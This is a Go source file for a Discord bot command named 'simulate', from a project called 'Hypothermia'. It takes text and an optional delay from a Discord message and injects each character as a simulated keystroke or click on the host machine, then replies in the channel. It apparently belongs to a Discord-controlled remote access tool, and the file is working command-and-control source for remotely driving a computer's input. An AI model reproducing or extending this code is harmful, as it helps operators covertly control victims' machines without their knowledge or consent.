package commands

import (
	"fmt"
	"regexp"
	"strconv"
	"strings"
	"time"

	"Hypothermia/src/misc"
	"Hypothermia/src/utils"

	"github.com/bwmarrin/discordgo"
)

const (
	simUsage     string = "[\"...key(s)\"] [delay?]"
	simArgsError string = "🟥 Expected 1 or more arguments."
	simFailed    string = "🟥 Failed to simulate: %s"

	simSuccess string = "🟩 Successfully simulated keys."
)

func (*SimulateCommand) Run(s *discordgo.Session, m *discordgo.MessageCreate, args []string) {
	allArgs := strings.Join(args, " ")

	regex := regexp.MustCompile(`"([^"]*)"`)
	matches := regex.FindStringSubmatch(allArgs)

	if len(matches) < 2 {
		s.ChannelMessageSendReply(m.ChannelID, fmt.Sprintf(misc.USAGE_F, simArgsError, simUsage), m.Reference())
		return
	}

	allowedText := matches[1]
	delay := time.Duration(0)

	disallowedText := strings.TrimSpace(regex.ReplaceAllString(allArgs, ""))
	if disallowedText != "" {
		delayInt, err := strconv.Atoi(disallowedText)
		if err != nil {
			s.ChannelMessageSendReply(m.ChannelID, misc.ERROR_CONVERT, m.Reference())
			return
		}

		if delayInt > 0 {
			delay = time.Duration(delayInt) * time.Millisecond
		}
	}

	for _, key := range allowedText {
		err := utils.SimulateInput(key)
		if err != nil {
			s.ChannelMessageSendReply(m.ChannelID, fmt.Sprintf(simFailed, err), m.Reference())
			return
		}

		if delay != 0 {
			time.Sleep(delay)
		}
	}

	s.ChannelMessageSendReply(m.ChannelID, simSuccess, m.Reference())
}

func (*SimulateCommand) Name() string {
	return "simulate"
}

func (*SimulateCommand) Info() string {
	return "simulates a key press or mouse click"
}

type SimulateCommand struct{}
